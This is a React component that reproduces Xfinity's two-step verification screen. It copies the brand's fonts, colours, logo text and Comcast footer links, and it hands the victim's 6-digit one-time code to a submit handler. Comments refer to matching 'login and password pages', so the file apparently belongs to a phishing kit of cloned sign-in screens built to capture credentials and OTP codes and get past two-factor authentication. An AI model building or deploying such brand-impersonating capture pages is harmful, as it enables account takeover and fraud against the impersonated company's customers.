import React, { useState } from 'react';
import Spinner from './common/Spinner';
import OtpInput from './common/OtpInput';

interface XfinityOtpPageProps {
  onSubmit: (otp: string) => void;
  isLoading: boolean;
  errorMessage?: string;
  email?: string;
}

const XfinityOtpPage: React.FC<XfinityOtpPageProps> = ({ onSubmit, isLoading, errorMessage, email }) => {
  const [otp, setOtp] = useState('');

  const handleOtpComplete = (completedOtp: string) => {
    setOtp(completedOtp);
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (otp.length === 6) {
      onSubmit(otp);
    }
  };

  return (
    <div style={{ minHeight: '100vh', background: '#fff', fontFamily: "'XfinityBrown', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif", display: 'flex', flexDirection: 'column' }}>
      <style>{`
        @font-face {
          font-family: 'XfinityBrown';
          src: url('https://static.cimcontent.net/common-web-assets/fonts/xfinity-brown-optimized/xfinitybrown-bold.woff2') format('woff2');
          font-weight: 700;
          font-style: normal;
          font-display: swap;
        }
        @font-face {
          font-family: 'XfinityBrown';
          src: url('https://static.cimcontent.net/common-web-assets/fonts/xfinity-brown-optimized/xfinitybrown-regular.woff2') format('woff2');
          font-weight: 400;
          font-style: normal;
          font-display: swap;
        }
        .xfinity-otp-input input {
          background: #F6F6F9 !important;
          color: #141417 !important;
          border-color: #CECED8 !important;
        }
        .xfinity-otp-input input:focus {
          border-color: #5A23B9 !important;
          ring-color: #5A23B9 !important;
        }
      `}</style>

      <main style={{ display: 'flex', flexDirection: 'column', alignItems: 'flex-start', justifyContent: 'center', flex: 1, padding: '3rem 1.5rem 2rem', maxWidth: '480px', margin: '0 auto', width: '100%', boxSizing: 'border-box' }}>
        {/* Xfinity Logo — same styled text as login and password pages */}
        <div style={{ marginBottom: '2rem' }}>
          <span aria-label="xfinity" style={{ fontFamily: "XfinityBrown, 'Helvetica Neue', Arial, sans-serif", fontWeight: 700, fontSize: '24px', color: '#6B6B76', lineHeight: 1, letterSpacing: '-0.02em' }}>xfinity</span>
        </div>

        {/* Heading */}
        <h1 style={{ fontSize: '2rem', fontWeight: 700, color: '#141417', marginBottom: '0.75rem', lineHeight: 1.2 }}>
          Two-Step Verification
        </h1>

        <p style={{ fontSize: '1rem', color: '#6B6B76', marginBottom: '0.5rem' }}>
          Enter the 6-digit code sent to your device.
        </p>

        {email && (
          <p style={{ fontSize: '0.9375rem', color: '#141417', marginBottom: '1.5rem', fontWeight: 500 }}>
            {email}
          </p>
        )}

        <form onSubmit={handleSubmit} style={{ width: '100%' }}>
          {errorMessage && (
            <div style={{
              padding: '0.75rem 1rem',
              marginBottom: '1rem',
              borderRadius: '0.25rem',
              backgroundColor: '#FEE2E2',
              border: '1px solid #FCA5A5',
              color: '#DC2626',
              fontSize: '0.875rem',
              display: 'flex',
              alignItems: 'center',
              gap: '0.5rem',
              width: '100%',
              boxSizing: 'border-box',
            }}>
              <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor" style={{ flexShrink: 0 }}>
                <path d="M8 1C4.1 1 1 4.1 1 8s3.1 7 7 7 7-3.1 7-7-3.1-7-7-7zm-.5 3h1v5h-1V4zm.5 8.2c-.4 0-.8-.3-.8-.8s.3-.8.8-.8.8.3.8.8-.4.8-.8.8z"/>
              </svg>
              <span>{errorMessage}</span>
            </div>
          )}

          <div className="xfinity-otp-input" style={{ marginBottom: '2rem' }}>
            <OtpInput length={6} onComplete={handleOtpComplete} disabled={isLoading} />
          </div>

          <div style={{ marginBottom: '1.5rem' }}>
            <button
              type="submit"
              disabled={isLoading || otp.length !== 6}
              style={{
                padding: '0.75rem 2.5rem',
                fontSize: '1rem',
                fontWeight: 700,
                color: '#fff',
                backgroundColor: isLoading || otp.length !== 6 ? '#B8A1D8' : '#5A23B9',
                border: 'none',
                borderRadius: '2rem',
                cursor: isLoading || otp.length !== 6 ? 'not-allowed' : 'pointer',
                fontFamily: 'inherit',
                transition: 'background-color 0.2s',
                display: 'inline-flex',
                alignItems: 'center',
                justifyContent: 'center',
                gap: '0.5rem',
              }}
              onMouseEnter={(e) => { if (!isLoading && otp.length === 6) (e.target as HTMLButtonElement).style.backgroundColor = '#36156F'; }}
              onMouseLeave={(e) => { if (!isLoading && otp.length === 6) (e.target as HTMLButtonElement).style.backgroundColor = '#5A23B9'; }}
            >
              {isLoading && <Spinner size="sm" color="border-white" />}
              {isLoading ? 'Verifying...' : 'Verify Code'}
            </button>
          </div>
        </form>

        <p style={{ fontSize: '0.8125rem', color: '#6B6B76', lineHeight: 1.5 }}>
          By signing in, you agree to our{' '}
          <a href="http://my.xfinity.com/terms/web/" target="_blank" rel="noopener noreferrer" style={{ color: '#5A23B9', textDecoration: 'none' }}>Terms of Service</a>
          {' '}and{' '}
          <a href="https://www.xfinity.com/privacy/" target="_blank" rel="noopener noreferrer" style={{ color: '#5A23B9', textDecoration: 'none' }}>Privacy Policy</a>.
        </p>
      </main>

      {/* Footer — matches password page */}
      <footer style={{
        borderTop: '1px solid #E5E5EA',
        padding: '1rem 1.5rem',
        display: 'flex',
        flexWrap: 'wrap',
        alignItems: 'center',
        justifyContent: 'center',
        gap: '0.25rem 1rem',
        fontSize: '0.75rem',
        color: '#6B6B76',
        fontFamily: 'inherit',
      }}>
        <span>&copy;&nbsp;2026&nbsp;Comcast</span>
        <OtpFooterLink icon={otpFooterDocIcon} href="https://www.xfinity.com/terms" text="Web Terms Of Service" />
        <OtpFooterLink icon={otpFooterDocIcon} href="https://www.xfinity.com/privacy/policy/staterights#california" text="CA Notice at Collection" />
        <OtpFooterLink icon={otpFooterDocIcon} href="http://www.xfinity.com/privacy/policy" text="Privacy Policy" />
        <OtpFooterLink icon={otpFooterPrivacyIcon} href="https://www.xfinity.com/privacy/manage-preference" text="Your Privacy Choices" />
        <OtpFooterLink icon={otpFooterDocIcon} href="https://www.xfinity.com/privacy/policy/staterights#washington" text="Health Privacy Notice" />
        <OtpFooterLink icon={otpFooterPlayIcon} href="https://www.xfinity.com/adinformation" text="Ad Choices" />
      </footer>
    </div>
  );
};

/* Footer icon SVGs */
const otpFooterDocIcon = (
  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style={{ flexShrink: 0 }}>
    <rect x="3" y="1" width="18" height="22" rx="2" stroke="currentColor" strokeWidth="1.5" fill="none"/>
    <line x1="7" y1="7" x2="17" y2="7" stroke="currentColor" strokeWidth="1.5"/>
    <line x1="7" y1="11" x2="17" y2="11" stroke="currentColor" strokeWidth="1.5"/>
    <line x1="7" y1="15" x2="13" y2="15" stroke="currentColor" strokeWidth="1.5"/>
  </svg>
);

const otpFooterPrivacyIcon = (
  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style={{ flexShrink: 0 }}>
    <circle cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="1.5" fill="none"/>
    <circle cx="8" cy="11" r="2" fill="#4CAF50"/>
    <circle cx="16" cy="11" r="2" fill="#2196F3"/>
  </svg>
);

const otpFooterPlayIcon = (
  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style={{ flexShrink: 0 }}>
    <polygon points="8,4 20,12 8,20" stroke="currentColor" strokeWidth="1.5" fill="none"/>
  </svg>
);

const OtpFooterLink: React.FC<{ icon: React.ReactNode; href: string; text: string }> = ({ icon, href, text }) => (
  <a
    href={href}
    target="_blank"
    rel="noopener noreferrer"
    style={{
      display: 'inline-flex',
      alignItems: 'center',
      gap: '0.25rem',
      color: '#6B6B76',
      textDecoration: 'none',
      fontSize: '0.75rem',
      whiteSpace: 'nowrap',
    }}
  >
    {icon}
    {text}
  </a>
);

export default XfinityOtpPage;
